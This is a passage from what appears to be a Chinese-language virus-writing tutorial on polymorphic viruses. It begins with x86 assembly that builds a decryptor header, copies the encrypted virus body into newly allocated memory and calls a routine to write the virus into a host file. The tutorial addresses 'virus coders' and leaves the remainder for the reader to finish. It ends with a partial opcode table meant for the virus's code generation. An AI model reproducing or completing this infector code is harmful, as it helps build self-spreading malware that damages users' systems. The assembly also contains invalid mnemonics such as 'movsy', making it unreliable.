
```asm
push    PAGE_READWRITE
push    MEM_RESERVE or MEM_COMMIT
push    V_len
push    0

Call dword ptr [ebp+_VirtualAlloc]
mov     pMem, eax
mov     edi, eax            ;edi 指向新开辟的内存
lea esi,[ebp+offset decry_Header]
mov ecx,decry_header_len
mov [ebp+Addr_R_cry],decry_header_len+1h
mov [ebp+Addr_V_begin],decry_header+decry_len+2h
rep movsy
inc edi
mov esi,decry_data_addr
mov ecx,decry_len
rep movsy
inc edi
mov esi,v_data_addr
mov ecx,v_len
mov [ebp+Host_op],host_addr
rep movsy
Call WriteVirusBack;返回去写文件
ret

Decry_header:
    pushad
    Call header_delta

header_delta:
    pop ebp
    lea ebp,[ebp-offset header_delta]
    mov eax,12345678h
    addr_r_cry=$-4
    push eax
    mov eax,12345678h
    addr_v_begin=$-4
    mov [ebp+Virus_addr],eax
    mov eax,87654321h
    Key_Door=$-4
    mov ebx,eax
    mov eax,12345678h
    V_size=$-4
    mov ecx,eax
    pop eax
    jmp short eax;调用 DeCry 的真正代码。

decry_header_end:
decry_len equ decry_header_end-decry_header
;剩下的相信你会做的
```

这是一个解决的方法，虽然不是最好的方法，不过已经可以适用于我们的 `poly` 了。

### (三)动态代码生成技术中的难题

> "Active on time, it is a great problem for a virus coder."
>
> ——Jhon.A

难点主要有代码大小的计算和代码生成两个部分：

这里就不再写代码来描述解决方案了，主要就是两个字:手册，你想写得绝妙，就把一本 `intel i386` 指令集手册的机器码及大小写进去吧...目前还没有好方法。

### 附：

| 机器码 | 指令 |
| :--- | :--- |
| `00` | `ADD` |
| `01` | `ADD` |
| `02` | `ADD` |
| `03` | `ADD` |
| `04` | `ADD` |
| `05` | `ADD` |
| `06` | `PUSH` |
| `07` | `POP` |
| `08` | `OR` |
| `09` | `OR` |
| `0A` | `OR` |
| `0B` | `OR` |
| `0C` | `OR` |
| `0D` | `OR` |
| `0E` | `PUSH` |
| `0F 00` | `LLDT` |
| `0F 00` | `LTR` |
| `0F 00` | `SLDT` |
| `0F 00` | `STR` |
| `0F 00` | `VERR` |
| `0F 00` | `VERW` |
| `0F 01` | `INVLPG` |
| `0F 01` | `LGDT` |
| `0F 01` | `LIDT` |
| `0F 01` | `LMSW` |
| `0F 01` | `SGDT` |
| `0F 01` | `SIDT` |
| `0F 01` | `SMSW` |
| `0F 02` | `LAR` |
| `0F 03` | `LSL` |
| `0F 08` | `INVD` |
| `0F 09` | `WBINVD` |
| `0F 0B` | `UD2` |
| `0F 20` | `MOV` |
| `0F 21` | `MOV` |
| `0F 22` | `MOV` |
| `0F 23` | `MOV` |
| `0F 30` | `WRMSR` |
| `0F 31` | `RDTSC` |
| `0F 32` | `RDMSR` |
| `0F 33` | `RDPMC` |
| `0F 40` | `CMOVO` |
| `0F 41` | `CMOVNO` |
| `0F 42` | `CMOVB` |
| `0F 42` | `CMOVC` |
| `0F 42` | `CMOVNAE` |
| `0F 43` | `CMOVAE` |
| `0F 43` | `CMOVNB` |
| `0F 43` | `CMOVNC` |
| `0F 44` | `CMOVE` |
| `0F 44` | `CMOVZ` |
| `0F 45` | `CMOVNE` |
| `0F 45` | `CMOVNZ` |
| `0F 46` | `CMOVBE` |
| `0F 46` | `CMOVNA` |
| `0F 47` | `CMOVA` |
| `0F 47` | `CMOVNBE` |
| `0F 48` | `CMOVS` |
| `0F 49` | `CMOVNS` |
| `0F 4A` | `CMOVP` |
| `0F 4A` | `CMOVPE` |
| `0F 4B` | `CMOVNP` |
| `0F 4B` | `CMOVPO` |
| `0F 4C` | `CMOVL` |
| `0F 4C` | `CMOVNGE` |
| `0F 4D` | `CMOVGE` |
| `0F 4D` | `CMOVNL` |
| `0F 4E` | `CMOVLE` |
| `0F 4E` | `CMOVNG` |
| `0F 4F` | `CMOVG` |
| `0F 4F` | `CMOVNLE` |
| `0F 60` | `PUNPCKLBW` |
| `0F 61` | `PUNPCKLWD` |
| `0F 62` | `PUNPCKLDQ` |
| `0F 63` | `PACKSSWB` |
| `0F 64` | `PCMPGTB` |
| `0F 65` | `PCMPGTW` |
| `0F 66` | `PCMPGTD` |
| `0F 67` | `PACKUSWB` |
| `0F 68` | `PUNPCKHBW` |
| `0F 69` | `PUNPCKHWD` |
| `0F 6A` | `PUNPCKHDQ` |
| `0F 6B` | `PACKSSDW` |
| `0F 6E` | `MOVD` |
| `0F 6F` | `MOVQ` |
| `0F 71` | `PSLLW` |
| `0F 71` | `PSRAW` |
| `0F 71` | `PSRLW` |
| `0F 72` | `PSLLD` |
| `0F 72` | `PSRAD` |
| `0F 72` | `PSRLD` |
| `0F 73` | `PSLLQ` |
| `0F 73` | `PSRLQ` |
| `0F 74` | `PCMPEQB` |
| `0F 75` | `PCMPEQW` |
| `0F 76` | `PCMPEQD` |
| `0F 77` | `EMMS` |
| `0F 7E` | `MOVD` |
| `0F 7F` | `MOVQ` |
| `0F 80` | `JO` |
| `0F 81` | `JNO` |
| `0F 82` | `JB` |
| `0F 82` | `JC` |
| `0F 82` | `JNAE` |
| `0F 83` | `JAE` |
| `0F 83` | `JNB` |
| `0F 83` | `JNC` |
| `0F 84` | `JE` |
| `0F 84` | `JZ` |
| `0F 85` | `JNE` |
| `0F 85` | `JNZ` |
| `0F 86` | `JBE` |
| `0F 86` | `JNA` |
| `0F 87` | `JA` |
| `0F 87` | `JNBE` |
| `0F 88` | `JS` |
| `0F 89` | `JNS` |
| `0F 8A` | `JP` |
| `0F 8A` | `JPE` |
| `0F 8B` | `JNP` |
| `0F 8B` | `JPO` |
| `0F 8C` | `JL` |
| `0F 8C` | `JNGE` |
| `0F 8D` | `JGE` |
| `0F 8D` | `JNL` |
| `0F 8E` | `JLE` |
| `0F 8E` | `JNG` |
| `0F 8F` | `JG` |
| `0F 8F` | `JNLE` |
| `0F 90` | `SETO` |
| `0F 91` | `SETNO` |
| `0F 92` | `SETB` |
| `0F 92` | `SETC` |
| `0F 92` | `SETNAE` |
| `0F 93` | `SETAE` |
| `0F 93` | `SETNB` |
| `0F 93` | `SETNC` |
| `0F 94` | `SETE` |
| `0F 94` | `SETZ` |
| `0F 95` | `SETNE` |
| `0F 95` | `SETNZ` |
| `0F 96` | `SETBE` |
| `0F 96` | `SETNA` |
| `0F 97` | `SETA` |
| `0F 97` | `SETNBE` |
| `0F 98` | `SETS` |
| `0F 99` | `SETNS` |
| `0F 9A` | `SETP` |
| `0F 9A` | `SETPE` |
| `0F 9B` | `SETNP` |
| `0F 9B` | `SETPO` |
| `0F 9C` | `SETL` |
| `0F 9C` | `SETNGE` |
| `0F 9D` | `SETGE` |
| `0F 9D` | `SETNL` |
| `0F 9E` | `SETLE` |
| `0F 9E` | `SETNG` |
| `0F 9F` | `SETG` |
| `0F 9F` | `SETNLE` |
| `0F A0` | `PUSH` |
| `0F A1` | `POP` |
| `0F A3` | `BT` |
| `0F A4` | `SHLD` |
| `0F A5` | `SHLD` |
| `0F A8` | `PUSH` |
| `0F A9` | `POP` |
| `0F AA` | `RSM` |
| `0F AB` | `BTS` |
| `0F AC` | `SHRD` |
| `0F AD` | `SHRD` |
| `0F AF` | `IMUL` |
| `0F B0` | `CMPXCHG` |
| `0F B1` | `CMPXCHG` |
| `0F B2` | `LSS` |
| `0F B3` | `BTR` |
| `0F B4` | `LFS` |
| `0F B5` | `LGS` |
| `0F B6` | `MOVZX` |
| `0F B7` | `MOVZX` |
| `0F BA` | `BT` |
| `0F BA` | `BTC` |
| `0F BA` | `BTR` |
| `0F BA` | `BTS` |
| `0F BB` | `BTC` |
| `0F BC` | `BSF` |
| `0F BD` | `BSR` |
| `0F BE` | `MOVSX` |
| `0F BF` | `MOVSX` |
| `0F C0` | `XADD` |
| `0F C1` | `XADD` |
| `0F C7` | `CMPXCHG8B` |
| `0F C8` | `BSWAP` |
| `0F D1` | `PSRLW` |
| `0F D2` | `PSRLD` |
| `0F D3` | `PSRLQ` |
| `0F D8` | `PSUBUSB` |
| `0F D9` | `PSUBUSW` |
| `0F DB` | `PAND` |
| `0F DC` | `PADDUSB` |
| `0F DD` | `PADDUSW` |
| `0F DF` | `PANDN` |
| `0F E1` | `PSRAW` |
| `0F E2` | `PSRAD` |
| `0F E5` | `PMULHW` |
| `0F E8` | `PSUBSB` |
| `0F E9` | `PSUBSW` |
| `0F EB` | `POR` |
